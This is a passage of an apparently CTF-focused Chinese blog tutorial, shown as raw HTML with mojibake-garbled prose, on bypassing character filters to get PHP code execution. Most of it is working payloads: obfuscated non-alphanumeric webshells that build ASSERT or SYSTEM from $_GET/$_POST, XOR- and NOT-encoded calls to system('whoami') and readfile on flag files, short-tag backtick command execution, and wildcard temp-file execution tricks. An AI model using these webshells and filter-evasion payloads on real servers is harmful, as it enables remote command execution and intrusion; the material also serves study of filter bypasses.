class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// O</span><br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// S</span><br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// T</span><br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$$____</span>;<br><span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[_]); <span class="hljs-comment">// ASSERT($_POST[_]);</span><br></code></pre></td></tr></table></figure><p>ç®€åŒ–ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_</span>=[];<span class="hljs-variable">$_</span>=@<span class="hljs-string">&quot;<span class="hljs-subst">$_</span>&quot;</span>;<span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;@&#x27;</span>];<span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$_</span>=<span class="hljs-variable">$$____</span>;<span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[_]);<br></code></pre></td></tr></table></figure><h4 id="Webshell-é€šç”¨"><a href="#Webshell-é€šç”¨" class="headerlink" title="Webshell(é€šç”¨):"></a>Webshell(é€šç”¨):</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$__</span>=++<span class="hljs-variable">$___</span>;--<span class="hljs-variable">$__</span>;<span class="hljs-variable">$____</span>=((_/_).<span class="hljs-string">&#x27;&#x27;</span>)&#123;<span class="hljs-variable">$__</span>&#125;;<span class="hljs-variable">$_____</span>=<span class="hljs-variable">$____</span>;++<span class="hljs-variable">$_____</span>;++<span class="hljs-variable">$_____</span>;++<span class="hljs-variable">$_____</span>;++<span class="hljs-variable">$_____</span>;++<span class="hljs-variable">$_____</span>;<span class="hljs-variable">$______</span>=<span class="hljs-variable">$_____</span>;++<span class="hljs-variable">$______</span>;++<span class="hljs-variable">$______</span>;++<span class="hljs-variable">$______</span>;++<span class="hljs-variable">$______</span>;++<span class="hljs-variable">$______</span>;++<span class="hljs-variable">$______</span>;<span class="hljs-variable">$_______</span>=<span class="hljs-variable">$_____</span>;++<span class="hljs-variable">$_______</span>;<span class="hljs-variable">$________</span>=<span class="hljs-variable">$______</span>;<span class="hljs-variable">$________</span>++;<span class="hljs-variable">$________</span>++;<span class="hljs-variable">$________</span>++;<span class="hljs-variable">$________</span>++;<span class="hljs-variable">$________</span>++;<span class="hljs-variable">$________</span>++;<span class="hljs-variable">$________</span>=(<span class="hljs-variable">$________</span>&#123;++<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$_________</span>=<span class="hljs-variable">$________</span>;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$_________</span>++;<span class="hljs-variable">$____________</span>=<span class="hljs-variable">$_____</span>.<span class="hljs-variable">$______</span>.<span class="hljs-variable">$_____</span>.<span class="hljs-variable">$_______</span>.<span class="hljs-variable">$________</span>.<span class="hljs-variable">$_________</span>;<span class="hljs-variable">$__________</span>=<span class="hljs-variable">$________</span>;<span class="hljs-variable">$__________</span>++;<span class="hljs-variable">$__________</span>++;<span class="hljs-variable">$___________</span>=<span class="hljs-string">&#x27;_&#x27;</span>.<span class="hljs-variable">$__________</span>.<span class="hljs-variable">$________</span>.<span class="hljs-variable">$_______</span>;<span class="hljs-variable">$___________</span>=<span class="hljs-variable">$$___________</span>;<span class="hljs-variable">$____________</span>(<span class="hljs-variable">$___________</span>&#123;<span class="hljs-variable">$_______</span>&#125;);<br><br><span class="hljs-comment">//SYSTEM($_GET&#123;T&#125;)</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=[];<br><span class="hljs-variable">$_</span> = <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;;&#x27;</span>];<br><span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<br><span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-comment">//E</span><br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$_</span>++;<br><span class="hljs-variable">$_</span>++;<span class="hljs-comment">//G</span><br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<br><span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<br><span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<br><span class="hljs-variable">$_</span>++;<br><span class="hljs-variable">$_</span>++;<span class="hljs-comment">//T</span><br><span class="hljs-variable">$__</span>=<span class="hljs-string">&#x27;_&#x27;</span>.<span class="hljs-variable">$__</span>.<span class="hljs-variable">$_</span>;<br>(<span class="hljs-variable">$$__</span>[<span class="hljs-string">&#x27;_&#x27;</span>])(<span class="hljs-variable">$$__</span>[<span class="hljs-string">&#x27;__&#x27;</span>]);<br><br><span class="hljs-comment">//($_GET[&#x27;_&#x27;])($_GET[&#x27;__&#x27;])</span><br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?_=system&amp;__=cat /f1agaaa<br>code=<span class="hljs-variable">$_</span>=[];<span class="hljs-variable">$_</span> = <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">$_</span>;<span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;;&#x27;</span>];<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$__</span>;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$_</span>++;<span class="hljs-variable">$__</span>=<span class="hljs-string">&#x27;_&#x27;</span>.<span class="hljs-variable">$__</span>.<span class="hljs-variable">$_</span>;(<span class="hljs-variable">$$__</span>[<span class="hljs-string">&#x27;_&#x27;</span>])(<span class="hljs-variable">$$__</span>[<span class="hljs-string">&#x27;__&#x27;</span>]);<br></code></pre></td></tr></table></figure><h2 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="_ç»•è¿‡"></a>_ç»•è¿‡</h2><p>ä¹‹å‰çš„ä¸‹åˆ’çº¿åªæ˜¯ä½œä¸ºå˜é‡åå­˜åœ¨ï¼Œå¯ä»¥ä½¿ç”¨å…¶ä»–å­—ç¬¦ä»£æ›¿ä¸‹åˆ’çº¿ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo<br>    <br><span class="hljs-comment">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br></code></pre></td></tr></table></figure><p>ä»»ä½•å­—ç¬¦ä¸ 0xff å¼‚æˆ–éƒ½ä¼šå–ç›¸åï¼Œè¿™æ ·å°±èƒ½å‡å°‘è¿ç®—é‡äº†ã€‚æ³¨æ„ï¼šæµ‹è¯•ä¸­å‘ç°ï¼Œä¼ å€¼æ—¶å¯¹äºè¦è®¡ç®—çš„éƒ¨åˆ†ä¸èƒ½ç”¨æ‹¬å·æ‹¬èµ·æ¥ï¼Œå› ä¸ºæ‹¬å·ä¹Ÿå°†è¢«è¯†åˆ«ä¸ºä¼ å…¥çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥ä½¿ç”¨ <code>&#123;&#125;</code> ä»£æ›¿ï¼ŒåŸå› æ˜¯ PHP çš„ use of undefined constant ç‰¹æ€§ã€‚ä¾‹å¦‚ <code>$&#123;_GET&#125;&#123;a&#125;</code> è¿™æ ·çš„è¯­å¥ PHP æ˜¯ä¸ä¼šåˆ¤ä¸ºé”™è¯¯çš„ï¼Œå› ä¸º <code>&#123;&#125;</code> æ˜¯ç”¨æ¥ç•Œå®šå˜é‡çš„ï¼Œè¿™å¥è¯å°±æ˜¯ä¼šå°† <code>_GET</code> è‡ªåŠ¨çœ‹ä¸ºå­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯ <code>$_GET[&#39;a&#39;]</code>ã€‚åé¢é‚£ä¸ª <code>()</code> ä¸ºçš„æ˜¯èƒ½å¤ŸåŠ¨æ€æ‰§è¡Œä¼ å…¥çš„ PHP å‡½æ•°ã€‚</p><p><img src="https://img.katck.com/images/2023/01/19/e474257197381ccfba80b21a10614fbd.png" alt="image-20230119101506260" style="zoom:50%;" /></p><p>å¦‚æœæƒ³è¦æ‰§è¡Œä»£å‡½æ•°çš„å‡½æ•°æ¯”å¦‚ <code>system(&#39;whoami&#39;)</code>ï¼Œé‚£æˆ‘ä»¬å¯ä»¥å¯¹åé¢æ‹¬å·é‡Œçš„å‚æ•°åšç›¸åŒçš„ç¼–ç å¤„ç†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;(%ff%ff%ff%ff%ff%ff^%<span class="hljs-number">88</span>%<span class="hljs-number">97</span>%<span class="hljs-number">90</span>%<span class="hljs-number">9</span>E%<span class="hljs-number">92</span>%<span class="hljs-number">96</span>);&amp;%ff=system<br>$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;(%ff%ff%ff%ff%ff%ff%ff%ff^%<span class="hljs-number">99</span>%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>E%<span class="hljs-number">98</span>%D1%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F);&amp;%ff=readfile<br>$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;(%ff%ff%ff%ff%ff%ff%ff%ff^%<span class="hljs-number">99</span>%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>E%<span class="hljs-number">98</span>%D1%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F);&amp;%ff=highlight_file<br><span class="hljs-comment">// å³: </span><br><span class="hljs-comment">// $&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;(&#x27;whoami&#x27;);&amp;%ff=system</span><br><span class="hljs-comment">// $&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;(&#x27;flag.php&#x27;);&amp;%ff=readfile</span><br><span class="hljs-comment">// $&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;(&#x27;flag.php&#x27;);&amp;%ff=highlight_file</span><br></code></pre></td></tr></table></figure><h4 id="å–åä¹Ÿæ˜¯å¯ä»¥çš„"><a href="#å–åä¹Ÿæ˜¯å¯ä»¥çš„" class="headerlink" title="å–åä¹Ÿæ˜¯å¯ä»¥çš„"></a>å–åä¹Ÿæ˜¯å¯ä»¥çš„</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">$&#123;~%A0%B8%BA%AB&#125;&#123;%ff&#125;();&amp;%ff=phpinfo<br>$&#123;~%A0%B8%BA%AB&#125;&#123;%ff&#125;(~%<span class="hljs-number">88</span>%<span class="hljs-number">97</span>%<span class="hljs-number">90</span>%<span class="hljs-number">9</span>E%<span class="hljs-number">92</span>%<span class="hljs-number">96</span>);&amp;%ff=system<br></code></pre></td></tr></table></figure><h2 id="ç»•è¿‡-1"><a href="#ç»•è¿‡-1" class="headerlink" title=";ç»•è¿‡"></a>;ç»•è¿‡</h2><p>æ— éœ€æ‹…å¿ƒï¼Œå‰é¢æˆ‘ä»¬å·²ç»è¯´äº†ï¼ŒPHP çŸ­æ ‡ç­¾ä¸­çš„ä»£ç ä¸éœ€è¦å†™åˆ†å·ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥æŠŠæ‰€æœ‰çš„ PHP è¯­å¥æ”¹æˆçŸ­æ ‡ç­¾å½¢å¼å°±è¡Œäº†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?=</span>`&#123;$&#123;~<span class="hljs-string">&quot;%a0%b8%ba%ab&quot;</span>&#125;[%a0]&#125;`<span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//$_GET[%a0]</span><br>    <span class="hljs-comment">//code=?&gt;&lt;?=`&#123;$&#123;~&quot;%a0%b8%ba%ab&quot;&#125;[%a0]&#125;`?&gt;&amp;%a0=whoami</span><br></code></pre></td></tr></table></figure><p>?&gt;é—­åˆäº†evalè‡ªå¸¦çš„&lt;?æ ‡ç­¾ã€‚æ¥ä¸‹æ¥ä½¿ç”¨äº†çŸ­æ ‡ç­¾ã€‚{}åŒ…å«çš„PHPä»£ç å¯ä»¥è¢«æ‰§è¡Œï¼Œ~â€%a0%b8%ba%abâ€ä¸ºâ€_GETâ€ï¼Œé€šè¿‡åå¼•å·è¿›è¡Œshellå‘½ä»¤æ‰§è¡Œã€‚æœ€åæˆ‘ä»¬åªè¦GETä¼ å‚%a0å³å¯æ‰§è¡Œå‘½ä»¤ã€‚</p><h2 id="ç»•è¿‡-2"><a href="#ç»•è¿‡-2" class="headerlink" title="$ç»•è¿‡"></a>$ç»•è¿‡</h2><p>å¦‚æœè¿‡æ»¤äº† <code>$</code>ï¼Œé‚£ä¹ˆåƒä¹‹å‰é‚£äº›æ„é€ å˜é‡çš„æ–¹æ³•å…¨éƒ½ä¸èƒ½ç”¨äº†ã€‚æˆ‘ä»¬å¯ä»¥åœ¨ä¸åŒç‰ˆæœ¬çš„ PHP ç¯å¢ƒä¸­å¯»æ‰¾çªç ´ã€‚</p><h3 id="PHP7-1"><a href="#PHP7-1" class="headerlink" title="PHP7"></a>PHP7</h3><p>PHP7å‰æ˜¯ä¸å…è®¸ç”¨<code>($a)();</code>è¿™æ ·çš„æ–¹æ³•æ¥æ‰§è¡ŒåŠ¨æ€å‡½æ•°çš„ï¼Œä½†PHP7ä¸­å¢åŠ äº†å¯¹æ­¤çš„æ”¯æŒã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>(&#39;phpinfo&#39;)();</code>æ¥æ‰§è¡Œå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªæ‹¬å·ä¸­å¯ä»¥æ˜¯ä»»æ„PHPè¡¨è¾¾å¼ã€‚</p><p>æ‰€ä»¥å¾ˆç®€å•äº†ï¼Œæ„é€ ä¸€ä¸ªå¯ä»¥ç”Ÿæˆ<code>phpinfo</code>è¿™ä¸ªå­—ç¬¦ä¸²çš„PHPè¡¨è¾¾å¼å³å¯ã€‚payloadå¦‚ä¸‹ï¼ˆä¸å¯è§å­—ç¬¦ç”¨urlç¼–ç è¡¨ç¤ºï¼‰ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">(~%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">96</span>%<span class="hljs-number">91</span>%<span class="hljs-number">99</span>%<span class="hljs-number">90</span>)();<br><span class="hljs-comment">//(&#x27;phpinfo&#x27;)();</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">shell=(~%<span class="hljs-number">9</span>c%<span class="hljs-number">9</span>e%<span class="hljs-number">93</span>%<span class="hljs-number">93</span>%a0%<span class="hljs-number">8</span>a%<span class="hljs-number">8</span>c%<span class="hljs-number">9</span>a%<span class="hljs-number">8</span>d%a0%<span class="hljs-number">99</span>%<span class="hljs-number">8</span>a%<span class="hljs-number">91</span>%<span class="hljs-number">9</span>c)(~%<span class="hljs-number">8</span>c%<span class="hljs-number">86</span>%<span class="hljs-number">8</span>c%<span class="hljs-number">8</span>b%<span class="hljs-number">9</span>a%<span class="hljs-number">92</span>,~%<span class="hljs-number">88</span>%<span class="hljs-number">97</span>%<span class="hljs-number">90</span>%<span class="hljs-number">9</span>e%<span class="hljs-number">92</span>%<span class="hljs-number">96</span>,<span class="hljs-string">&#x27;&#x27;</span>);<br><span class="hljs-comment">//call_user_func(system,whoami)</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">(~%<span class="hljs-number">8</span>C%<span class="hljs-number">86</span>%<span class="hljs-number">8</span>C%<span class="hljs-number">8</span>B%<span class="hljs-number">9</span>A%<span class="hljs-number">92</span>)(~%<span class="hljs-number">93</span>%<span class="hljs-number">8</span>C%DF%D0);    <span class="hljs-comment">// system(&#x27;ls /&#x27;);</span><br></code></pre></td></tr></table></figure><h3 id="PHP5-1"><a href="#PHP5-1" class="headerlink" title="PHP5"></a>PHP5</h3><h5 id="é€šé…ç¬¦æ‰§è¡Œå‘½ä»¤"><a href="#é€šé…ç¬¦æ‰§è¡Œå‘½ä»¤" class="headerlink" title="é€šé…ç¬¦æ‰§è¡Œå‘½ä»¤"></a>é€šé…ç¬¦æ‰§è¡Œå‘½ä»¤</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">code=<span class="hljs-string">?&gt;</span>&lt;<span class="hljs-string">?=</span><span class="hljs-string">`/???/??? ????.???`</span><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>å…¶ä¸­/???/??? ????.???åŒ¹é…/bin/cat flag.phpï¼Œè¿™æ ·ä¹Ÿèƒ½å¾—åˆ°flagã€‚</p><h5 id="é€šè¿‡é€šé…ç¬¦åŒ¹é…ä¸´æ—¶æ–‡ä»¶ï¼Œä½¿ç”¨åå•å¼•å·æ‰§è¡Œ"><a href="#é€šè¿‡é€šé…ç¬¦åŒ¹é…ä¸´æ—¶æ–‡ä»¶ï¼Œä½¿ç”¨åå•å¼•å·æ‰§è¡Œ" class="headerlink" title="é€šè¿‡é€šé…ç¬¦åŒ¹é…ä¸´æ—¶æ–‡ä»¶ï¼Œä½¿ç”¨åå•å¼•å·æ‰§è¡Œ"></a>é€šè¿‡é€šé…ç¬¦åŒ¹é…ä¸´æ—¶æ–‡ä»¶ï¼Œä½¿ç”¨åå•å¼•å·æ‰§è¡Œ</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?&gt;</span>&lt;<span class="hljs-string">?=</span><span class="hljs-string">`. /???/????????[@-[]`</span>;<span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">?&gt;&lt;?=`.+/<span class="hljs-meta">%</span><span class="hljs-number">3</span>f<span class="hljs-meta">%</span><span class="hljs-number">3</span>f<span class="hljs-meta">%</span><span class="hljs-number">3</span>f/<span class="hljs-meta">%</span><span class="hljs-number">3</span>f<span class="hljs-meta">%</span><span class="hljs-number">3</span>f<span class="hljs-meta">%</span><span class="hljs-number">3</span>f<span class="hljs-meta">%</span><span class="hljs-number">3</span>f<span class="hljs-meta">%</span><span class="hljs-number">3</span>f<span class="hljs-meta">%</span><span class="hljs-number">3</span>f<span class="hljs-meta">%</span><span class="hljs-number">3</span>f<span class="hljs-meta">%</span><span class="hljs-number">3</span>f[<span class="hljs-meta">%</span><span class="hljs-number">40</span>-[]`<span class="hljs-meta">%</span><span class="hljs-number">3</span>b<span class="hljs-meta">%</span><span class="hljs-number">3</span>f&gt;<br></code></pre></td></tr></table></figure><p><img src="https://img.katck.com/images/2023/01/19/abab0451ab394e0657700c59b5f0c21b.png" alt="image-20230113222009790"></p><h2 id="ç»•è¿‡-3"><a href="#ç»•è¿‡-3" class="headerlink" 